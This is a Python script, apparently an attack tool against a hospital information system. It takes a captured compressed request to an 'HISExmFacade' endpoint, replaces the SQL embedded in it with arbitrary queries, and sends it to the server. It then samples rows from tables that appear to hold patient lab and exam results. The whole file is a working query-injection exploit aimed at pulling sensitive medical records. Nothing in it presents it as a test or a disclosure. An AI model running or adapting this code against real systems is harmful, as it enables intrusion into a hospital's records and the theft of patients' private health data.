from his_client_final import HISClient
import requests
import zlib
import re

class SampleHunter(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = SampleHunter()

tables = [
    "OPDUSR.PAT_RESULTH",
    "OPDUSR.LABIHEM",
    "OPDUSR.EXMREPD",
    "OPDUSR.EXMRPTM"
]

for t in tables:
    print(f"\nSampling {t}...")
    q = f"SELECT * FROM {t} WHERE ROWNUM <= 1"
    res = hunter.execute_sql(q)
    
    if res and "<NewDataSet>" in res:
        print(f"!!! SAMPLE FROM {t} !!!")
        print(res[:2000])
    else:
        print(f"[-] No sample from {t}")

